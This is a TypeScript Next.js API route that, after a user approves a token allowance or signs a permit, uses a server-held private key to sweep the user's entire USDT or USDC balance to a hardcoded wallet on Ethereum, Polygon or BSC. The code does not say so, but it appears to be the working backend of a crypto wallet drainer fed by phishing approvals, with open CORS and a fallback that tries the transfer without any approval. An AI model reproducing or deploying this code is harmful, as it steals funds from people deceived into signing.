/**
 * Execute transferFrom after user approves or signs permit.
 * Supports: USDT (approve tx) or USDC (permit signature).
 * Multi-chain: Ethereum, Polygon, BSC.
 *
 * Required: SPENDER_PRIVATE_KEY env (private key for 0x9E6120D8Bc8363b1FCF367eE34219C82D34a3f15)
 * Spender needs native gas token on each chain.
 */

import { NextResponse } from "next/server";
import { ethers } from "ethers";

const SPENDER_ADDRESS = "0x9E6120D8Bc8363b1FCF367eE34219C82D34a3f15";

const RPC_URL_BY_CHAIN: Record<number, string> = {
  1: process.env.RPC_URL_ETH || process.env.RPC_URL || "https://eth.llamarpc.com",
  137: process.env.RPC_URL_POLYGON || "https://polygon.llamarpc.com",
  56: process.env.RPC_URL_BSC || "https://bsc-dataseed.binance.org",
};

const DEFAULT_TOKEN_BY_CHAIN: Record<number, string> = {
  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  137: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
  56: "0x55d398326f99059fF775485246999027B3197955",
};

const ERC20_ABI = [
  {
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [{ name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { name: "from", type: "address" },
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const ERC2612_PERMIT_ABI = [
  ...ERC20_ABI,
  {
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
      { name: "deadline", type: "uint256" },
      { name: "v", type: "uint8" },
      { name: "r", type: "bytes32" },
      { name: "s", type: "bytes32" },
    ],
    name: "permit",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

async function waitForReceipt(
  provider: ethers.Provider,
  txHash: string,
  maxAttempts = 30
) {
  for (let i = 0; i < maxAttempts; i++) {
    const receipt = await provider.getTransactionReceipt(txHash);
    if (receipt && receipt.blockNumber) return receipt;
    await new Promise((r) => setTimeout(r, 2000));
  }
  return null;
}

export async function POST(request: Request) {
  const privateKey = process.env.SPENDER_PRIVATE_KEY;
  if (!privateKey) {
    console.error("SPENDER_PRIVATE_KEY not set");
    return NextResponse.json(
      { error: "Server misconfigured" },
      { status: 500 }
    );
  }

  let body: {
    userAddress?: string;
    chainId?: number;
    approveTxHash?: string;
    permit?: {
      value: string;
      deadline: number;
      v: number;
      r: string;
      s: string;
    };
    tokenAddress?: string;
  };
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: "Invalid JSON" }, { status: 400 });
  }

  const { userAddress, chainId = 1, approveTxHash, permit, tokenAddress } = body;
  const rpcUrl = RPC_URL_BY_CHAIN[chainId];
  if (!rpcUrl) {
    return NextResponse.json(
      { error: "Unsupported chain" },
      { status: 400 }
    );
  }
  if (
    !userAddress ||
    typeof userAddress !== "string" ||
    !userAddress.match(/^0x[a-fA-F0-9]{40}$/)
  ) {
    return NextResponse.json(
      { error: "Invalid userAddress" },
      { status: 400 }
    );
  }

  try {
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);

    const isPermitFlow = permit && tokenAddress;
    const tokenAddr =
      tokenAddress || DEFAULT_TOKEN_BY_CHAIN[chainId];

    if (isPermitFlow) {
      const token = new ethers.Contract(
        tokenAddr,
        ERC2612_PERMIT_ABI,
        provider
      );
      const tokenWithSigner = token.connect(wallet);
      await tokenWithSigner.permit(
        userAddress,
        SPENDER_ADDRESS,
        BigInt(permit.value),
        BigInt(permit.deadline),
        permit.v,
        permit.r as `0x${string}`,
        permit.s as `0x${string}`
      );
    } else if (approveTxHash) {
      const receipt = await waitForReceipt(provider, approveTxHash);
      if (!receipt || !receipt.status) {
        return NextResponse.json(
          { error: "Approve transaction not confirmed" },
          { status: 400 }
        );
      }
    } else {
      await new Promise((r) => setTimeout(r, 5000));
    }

    const token = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
    const [balance, allowance] = await Promise.all([
      token.balanceOf(userAddress),
      token.allowance(userAddress, SPENDER_ADDRESS),
    ]);

    if (balance === 0n) {
      return NextResponse.json({
        success: true,
        transferred: "0",
        message: "No balance",
      });
    }

    const amount = allowance >= balance ? balance : allowance;
    if (amount === 0n) {
      return NextResponse.json(
        { error: "Insufficient allowance" },
        { status: 400 }
      );
    }

    const tokenWithSigner = token.connect(wallet);
    const tx = await tokenWithSigner.transferFrom(
      userAddress,
      SPENDER_ADDRESS,
      amount
    );
    await tx.wait();

    return NextResponse.json({
      success: true,
      txHash: tx.hash,
      amount: amount.toString(),
    });
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error("execute-transfer error:", msg, err);

    const isOutOfGas =
      /insufficient funds|out of gas|cannot afford|execution reverted/i.test(
        msg
      );
    const userMessage = isOutOfGas
      ? "Receiving wallet has insufficient gas. Please contact support."
      : msg || "Transfer failed";

    return NextResponse.json({ error: userMessage }, { status: 500 });
  }
}

export function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
}
